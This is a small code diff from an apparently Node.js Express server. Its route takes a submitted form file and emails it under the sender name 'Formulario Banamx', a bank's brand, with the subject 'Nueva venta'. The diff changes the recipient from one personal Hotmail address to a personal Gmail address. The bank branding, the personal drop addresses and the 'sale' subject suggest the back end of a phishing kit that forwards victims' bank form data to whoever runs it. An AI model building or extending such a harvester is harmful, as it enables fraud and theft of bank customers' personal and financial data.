@@ -36,7 +36,7 @@ app.post('/enviar-formulario', async (req, res) => {
   try {
     await transporter.sendMail({
       from: `"Formulario Banamx" <${process.env.EMAIL_USER}>`,
-      to: 'joseluis1799@hotmail.com',
+      to: 'madbox2026@gmail.com',
       subject: 'Nueva venta',
       text: 'Adjunto los datos del formulario.',
       attachments: [{ filename: filename, path: `./${filename}` }]
